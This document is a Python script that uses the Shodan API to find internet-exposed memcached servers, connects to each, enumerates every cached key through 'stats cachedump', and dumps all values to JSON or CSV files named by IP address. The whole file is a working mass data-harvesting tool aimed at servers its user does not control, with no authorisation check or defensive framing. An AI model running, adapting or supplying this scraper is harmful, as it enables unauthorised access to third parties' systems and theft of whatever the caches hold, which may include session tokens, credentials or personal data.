#!/usr/bin/env python

import shodan
import socket
import json
import csv
import argparse
import os


def make_query(query, s, chunk=4096):
    s.sendall("{}\r\n".format(query).encode())
    if not s:
        raise Exception("Socket not connected.")
    buf = bytes()
    while True:
        if buf[-2:] == b"\r\n":
            break
        data = s.recv(chunk)
        if not data:
            raise Exception("Broken socket")
        buf += data
    return buf[:-2].decode().split("\r\n")


def get_key_lengths(s):
    k = set()
    for line in make_query("stats items", s):
        tokens = line.split(":")
        if len(tokens) == 3:
            k.add(tokens[1])
    return k


def dump_key(key, s):
    for tag in make_query("stats cachedump {} 999999".format(key), s)[:-1]:
        elements = tag.split(" ")
        yield elements[1] if len(elements) >= 3 else None


def dump_values(keys, s):
    response = make_query("get {}".format(" ".join(keys)), s)
    result = {}
    for i in range(0, len(response) - 1, 2):
        result[response[i].split(" ")[1]] = response[i + 1]
    return result


def scrape(server, outdir, as_json):
    print("[ ] Connecting to {}:{}.".format(
        server.get("ip_str"), server.get("port")))
    s = socket.create_connection(
        (server.get("ip_str"), server.get("port")), timeout=5)
    ip = server.get("ip_str")
    key_lengths = get_key_lengths(s)
    print("[ ] Found {} key lengths at {}.".format(len(key_lengths), ip))
    cache = set()
    for key_length in key_lengths:
        cache.update(dump_key(key_length, s))
    print("[ ] Found {} keys at {}.".format(len(cache), ip))
    values = dump_values(cache, s)
    print("[ ] Dumped {} key values from {}.".format(len(values), ip))
    if as_json:
        fname = os.path.join(outdir, "{}.json".format(ip))
        with open(fname, "w") as out_file:
            out_file.write(json.dumps(values))
        print("[+] Wrote JSON to {}".format(fname))
    else:
        fname = os.path.join(outdir, "{}.csv".format(ip))
        with open(fname, "w", newline="") as out_file:
            writer = csv.writer(out_file)
            writer.writerow(["Key", "Value"])
            for (k, v) in values.items():
                writer.writerow([k, v])
        print("[+] Wrote CSV to {}".format(fname))


def get_servers(api_key):
    api = shodan.Shodan(api_key)
    memcached_servers = []
    try:
        results = api.search("product:memcached")
        print("Results found: {}".format(results["total"]))
        for result in results.get("matches"):
            elem = {"ip_str": result.get("ip_str"), "port": result.get("port")}
            memcached_servers.append(elem)
            print("[ ] Found memcached server at IP: {}".format(
                result["ip_str"]))
    except shodan.APIError as e:
        print("[-] Shodan error: %s" % e)
    return memcached_servers


parser = argparse.ArgumentParser(
    description="Scrape data from memcached servers.")
parser.add_argument("--key", type=str, help="Shodan API key.")
parser.add_argument(
    "--out", type=str, default="out", help="Output directory for caches.")
parser.add_argument(
    "--json",
    action="store_true",
    default=False,
    help="Output as JSON. (Default: CSV)")
args = parser.parse_args()
if not os.path.exists(args.out):
    os.makedirs(args.out)
for server in get_servers(args.key):
    try:
        scrape(server, args.out, args.json)
    except Exception as e:
        print("[-] Error connecting to {}: {}".format(server.get("ip_str"), e))
